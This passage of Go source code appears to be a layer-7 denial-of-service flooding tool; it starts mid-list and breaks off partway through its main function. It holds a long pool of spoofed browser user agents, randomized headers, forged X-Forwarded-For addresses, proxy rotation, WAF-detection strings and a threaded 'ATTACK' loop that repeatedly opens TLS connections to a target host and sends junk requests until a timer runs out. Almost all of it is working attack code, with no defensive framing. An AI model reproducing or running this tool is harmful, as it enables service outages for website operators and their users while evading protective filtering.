    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/677.2.39 (KHTML, like Gecko) Version/16.0 Safari/677.2.39",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/808.4.24 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/808.4.24",
    "Mozilla/5.0 (Linux; Android 7; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4227.180 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5617.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/810.4.8 (KHTML, like Gecko) Version/17.0 Safari/810.4.8",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/843.4.34 (KHTML, like Gecko) Version/14.0 Safari/843.4.34",
    "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/109.0.4587.182 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/117.0.4994.161 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4552.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/111.0.4177.179 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/120.0.4581.108 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/770.3.17 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/770.3.17",
    "Mozilla/5.0 (Linux; Android 8; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5449.148 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/902.4.14 (KHTML, like Gecko) Version/17.0 Safari/902.4.14",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/894.3.10 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/894.3.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_8) AppleWebKit/844.2.40 (KHTML, like Gecko) Version/14.0 Safari/844.2.40",
    "Mozilla/5.0 (Linux; Android 14; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4265.104 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/964.2.13 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/964.2.13",
    "Mozilla/5.0 (Linux; Android 7; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.5313.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4682.180 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/111.0.5025.188 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4443.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4803.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4327.159 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/894.5.5 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/894.5.5",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/871.5.44 (KHTML, like Gecko) Version/13.0 Safari/871.5.44",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/867.5.24 (KHTML, like Gecko) Version/14.0 Safari/867.5.24",
    "Mozilla/5.0 (X11; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/967.2.7 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/967.2.7",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4372.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4447.197 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4486.156 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/733.1.46 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/733.1.46",
    "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Linux; Android 13; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4592.132 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/931.4.41 (KHTML, like Gecko) Version/15.0 Safari/931.4.41",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/610.4.19 (KHTML, like Gecko) Version/14.0 Safari/610.4.19",
    "Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/805.3.30 (KHTML, like Gecko) Version/16.0 Safari/805.3.30",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/695.5.46 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/695.5.46",
    "Mozilla/5.0 (Linux; Android 11; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.5212.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.5284.184 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/899.1.44 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/899.1.44",
    "Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/119.0.5839.176 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/983.2.16 (KHTML, like Gecko) Version/16.0 Safari/983.2.16",
   "Mozilla/5.0 (Linux; Android 14; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4761.152 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/90.0.2536.106 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4345.138 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/120.0.5904.195 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5135.128 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5394.125 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/800.3.9 (KHTML, like Gecko) Version/13.0 Safari/800.3.9",
    "Mozilla/5.0 (Linux; Android 7; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4015.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/115.0.5215.177 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.5540.195 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/621.2.41 (KHTML, like Gecko) Version/15.0 Safari/621.2.41",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5090.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/792.5.32 (KHTML, like Gecko) Version/15.0 Safari/792.5.32",
    "Mozilla/5.0 (Linux; Android 7; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.5085.145 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/720.3.32 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/720.3.32",
    "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.4126.139 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/967.4.22 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/967.4.22",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/865.2.14 (KHTML, like Gecko) Version/16.0 Safari/865.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/794.4.13 (KHTML, like Gecko) Version/13.0 Safari/794.4.13",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/840.2.8 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/840.2.8",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/98.0.3761.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/995.4.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/995.4.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/896.2.26 (KHTML, like Gecko) Version/14.0 Safari/896.2.26",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/110.0.2859.180 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/703.1.8 (KHTML, like Gecko) Version/16.0 Safari/703.1.8",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/897.3.23 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/897.3.23",
    "Mozilla/5.0 (Linux; Android 15; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4811.128 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/932.3.45 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/932.3.45",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/93.0.3504.136 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/657.2.26 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/657.2.26",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/916.3.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/916.3.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/896.5.25 (KHTML, like Gecko) Version/15.0 Safari/896.5.25",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4957.120 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.5752.176 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/767.1.18 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/767.1.18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/811.3.11 (KHTML, like Gecko) Version/14.0 Safari/811.3.11",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/686.2.37 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/686.2.37",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/86.0.4366.128 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/642.1.42 (KHTML, like Gecko) Version/17.0 Safari/642.1.42",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/98.0.4768.200 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4833.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/787.1.3 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/787.1.3",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/688.3.41 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/688.3.41",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/688.4.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/688.4.15",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4959.114 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/809.1.13 (KHTML, like Gecko) Version/15.0 Safari/809.1.13",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/840.2.28 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/840.2.28",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5551.199 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/621.2.25 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/621.2.25",
    "Mozilla/5.0 (Linux; Android 9; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.5831.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/610.5.17 (KHTML, like Gecko) Version/16.0 Safari/610.5.17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/855.4.45 (KHTML, like Gecko) Version/14.0 Safari/855.4.45",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/776.1.14 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/776.1.14",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/887.3.49 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/887.3.49",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/645.1.23 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/645.1.23",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.5077.113 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4717.102 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/102.0.3370.86 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4666.123 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/865.4.11 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/865.4.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/729.2.34 (KHTML, like Gecko) Version/17.0 Safari/729.2.34",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/798.5.17 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/798.5.17",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/110.0.4317.139 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4598.176 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.5993.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/96.0.4482.13 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/854.1.24 (KHTML, like Gecko) Version/16.0 Safari/854.1.24",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/988.3.16 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/988.3.16",
    "Mozilla/5.0 (Linux; Android 13; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.5274.187 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/938.3.44 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/938.3.44",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4541.195 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/95.0.5839.167 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/699.4.47 (KHTML, like Gecko) Version/15.0 Safari/699.4.47",
    "Mozilla/5.0 (Linux; Android 7; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5526.177 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/795.2.49 (KHTML, like Gecko) Version/13.0 Safari/795.2.49",
    "Mozilla/5.0 (Linux; Android 7; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4264.178 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/838.1.10 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/838.1.10",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/916.2.20 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/916.2.20",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/617.5.36 (KHTML, like Gecko) Version/15.0 Safari/617.5.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/686.4.36 (KHTML, like Gecko) Version/17.0 Safari/686.4.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/880.2.47 (KHTML, like Gecko) Version/16.0 Safari/880.2.47",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/699.5.14 (KHTML, like Gecko) Version/17.0 Safari/699.5.14",
}

var referers = []string{
	"http://www.google.com/search?q=",
	"http://www.bing.com/search?q=",
	"http://duckduckgo.com/?q=",
}

var wafHints = []string{
	"cloudflare", "access denied", "akamai", "imperva",
	"incapsula", "aws waf", "barracuda", "sucuri",
	"mod_security", "forbidden",
}

var headerPool = []string{
	"Accept: */*",
	"Accept-Language: en-US,en;q=0.9",
	"Accept-Encoding: gzip, deflate, br",
	"Cache-Control: no-cache",
	"Pragma: no-cache",
	"Upgrade-Insecure-Requests: 1",
	"DNT: 1",
}

var sentCount, errCount, wafHits, handshakes int32
var lastStatus int32
var debugHandshake bool
var proxies []string

// ---------------- UTILS ----------------
func randString(n int) string {
	chars := []rune("0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func buildPayload() string {
	payloads := []string{
		fmt.Sprintf("id=%d&name=%s", rand.Intn(9999), randString(5)),
		fmt.Sprintf("q=%s&rand=%s", randString(4), randString(6)),
		fmt.Sprintf("user=%s&pass=%s", randString(5), randString(6)),
		fmt.Sprintf("{\"username\":\"%s\",\"password\":\"%s\"}", randString(5), randString(8)),
		fmt.Sprintf("{\"data\":{\"id\":\"%s\",\"val\":\"%s\"}}", randString(4), randString(6)),
		fmt.Sprintf("id=%s&junk=%s", url.QueryEscape(randString(6)), url.QueryEscape(randString(10))),
		strings.Repeat("X", 200),
		base64.StdEncoding.EncodeToString([]byte(randString(20))),
		fmt.Sprintf("token=%s&auth=%s", randString(12), randString(16)),
	}
	return payloads[rand.Intn(len(payloads))]
}

func detectWAF(resp string) bool {
	respLower := strings.ToLower(resp)
	for _, hint := range wafHints {
		if strings.Contains(respLower, hint) {
			return true
		}
	}
	return false
}

func cleanHost(h string) string {
	h = strings.TrimPrefix(h, "https://")
	h = strings.TrimPrefix(h, "http://")
	return strings.Split(h, "/")[0]
}

func atoi(s string) int {
	n, _ := strconv.Atoi(s)
	return n
}

func loadProxies(file string) {
	data, err := os.ReadFile(file)
	if err != nil {
		fmt.Println("⚠️ Could not read proxy file:", err)
		return
	}
	lines := strings.Split(string(data), "\n")
	for _, l := range lines {
		l = strings.TrimSpace(l)
		if l != "" {
			proxies = append(proxies, l)
		}
	}
	fmt.Printf("✅ Loaded %d proxies\n", len(proxies))
}

// ---------------- CONNECT VIA PROXY ----------------
func dialProxy(proxyAddr, targetHost string, targetPort int) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxyAddr, 5*time.Second)
	if err != nil {
		return nil, err
	}
	connectReq := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n", targetHost, targetPort, targetHost, targetPort)
	_, err = conn.Write([]byte(connectReq))
	if err != nil {
		conn.Close()
		return nil, err
	}
	buf := make([]byte, 256)
	n, _ := conn.Read(buf)
	if n <= 0 || !strings.Contains(string(buf), "200") {
		conn.Close()
		return nil, fmt.Errorf("proxy refused")
	}
	return conn, nil
}

// ---------------- ATTACK ----------------
func sendTLSRequest(host string, port int, method string, stopTime time.Time, wg *sync.WaitGroup) {
	defer wg.Done()

	for time.Now().Before(stopTime) {
		var rawConn net.Conn
		var err error

		// Proxy mode with fast switch (no retry delay)
		if len(proxies) > 0 {
			proxy := proxies[rand.Intn(len(proxies))]
			rawConn, err = dialProxy(proxy, host, port)
			if err != nil {
				atomic.AddInt32(&errCount, 1)
				continue
			}
		} else {
			rawConn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 5*time.Second)
			if err != nil {
				atomic.AddInt32(&errCount, 1)
				continue
			}
		}

		// TLS handshake
		conn := tls.Client(rawConn, &tls.Config{InsecureSkipVerify: true, ServerName: host})
		err = conn.Handshake()
		if err != nil {
			atomic.AddInt32(&errCount, 1)
			conn.Close()
			continue
		}
		atomic.AddInt32(&handshakes, 1)
		if debugHandshake {
			state := conn.ConnectionState()
			fmt.Printf("\n[Handshake] Version: %x | CipherSuite: %x | Server: %s",
				state.Version, state.CipherSuite, state.ServerName)
		}

		// Path + payload
		path := "/" + randString(4)
		payload := buildPayload()

		// Shuffle headers
		headerCount := rand.Intn(len(headerPool)) + 1
		shuffled := rand.Perm(len(headerPool))
		selected := []string{}
		for i := 0; i < headerCount; i++ {
			selected = append(selected, headerPool[shuffled[i]])
		}

		// Mix mode: sometimes minimal, sometimes full
		var req string
		if rand.Intn(2) == 0 { // Minimal headers
			req = fmt.Sprintf("%s %s?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n",
				method, path, payload, host, userAgents[rand.Intn(len(userAgents))])
		} else { // Full headers
			if method == "POST" {
				req = fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n", path, host)
				req += "User-Agent: " + userAgents[rand.Intn(len(userAgents))] + "\r\n"
				req += "Referer: " + referers[rand.Intn(len(referers))] + randString(5) + "\r\n"
				req += fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
				req += "Cookie: sessionid=" + randString(12) + "; token=" + randString(16) + "\r\n"
				for _, h := range selected {
					req += h + "\r\n"
				}
				req += "Content-Type: application/x-www-form-urlencoded\r\n"
				req += fmt.Sprintf("Content-Length: %d\r\n", len(payload))
				req += "Connection: keep-alive\r\n\r\n" + payload
			} else {
				req = fmt.Sprintf("GET %s?%s HTTP/1.1\r\nHost: %s\r\n", path, payload, host)
				req += "User-Agent: " + userAgents[rand.Intn(len(userAgents))] + "\r\n"
				req += "Referer: " + referers[rand.Intn(len(referers))] + randString(5) + "\r\n"
				req += "Cookie: id=" + randString(10) + "; key=" + randString(8) + "\r\n"
				for _, h := range selected {
					req += h + "\r\n"
				}
				req += "Connection: keep-alive\r\n\r\n"
			}
		}

		// Send
		_, err = conn.Write([]byte(req))
		if err != nil {
			atomic.AddInt32(&errCount, 1)
			conn.Close()
			continue
		}

		// Response
		reader := bufio.NewReader(conn)
		line, _ := reader.ReadString('\n')
		if strings.HasPrefix(line, "HTTP/") {
			parts := strings.Split(line, " ")
			if len(parts) >= 2 {
				code, _ := strconv.Atoi(parts[1])
				atomic.StoreInt32(&lastStatus, int32(code))
			}
		}

		buf, _ := reader.Peek(200)
		if detectWAF(string(buf)) {
			atomic.AddInt32(&wafHits, 1)
		} else {
			atomic.AddInt32(&sentCount, 1)
		}
		conn.Close()
	}
}

// ---------------- STATUS ----------------
func printStatus(stopTime time.Time) {
	for time.Now().Before(stopTime) {
		fmt.Printf("\rSent: %d | Errors: %d | WAF Hits: %d | Handshakes: %d | Last Code: %d",
			atomic.LoadInt32(&sentCount),
			atomic.LoadInt32(&errCount),
			atomic.LoadInt32(&wafHits),
			atomic.LoadInt32(&handshakes),
			atomic.LoadInt32(&lastStatus))
		time.Sleep(1 * time.Second)
	}
}

// ---------------- MAIN ----------------
func main() {
	if len(os.Args) < 7 {
		fmt.Println("Usage:", os.Args[0], "python3 doom_cannon.py")
		os.Exit(1)
	}

	host := cleanHost(os.Args[1])
	port := atoi(os.Args[2])
	method := strings.ToUpper(os.Args[3])
	threads := atoi(os.Args[4])
	duration := atoi(os.Args[5])
	debugHandshake = strings.ToLower(os.Args[6]) == "true"

	if len(os.Args) >= 8 {
		loadProxies(os.Args[7])
	}

	stopTime := time.Now().Add(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup

